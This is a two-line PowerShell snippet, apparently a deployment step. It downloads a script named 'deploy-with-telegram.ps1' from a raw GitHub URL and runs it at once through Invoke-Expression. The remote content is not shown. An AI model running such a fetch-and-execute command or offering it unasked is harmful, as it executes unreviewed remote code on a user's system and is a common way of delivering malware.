$url="https://raw.githubusercontent.com/Zhuss1/main/main/deploy-with-telegram.ps1"
Invoke-Expression (Invoke-WebRequest -UseBasicParsing $url).Content
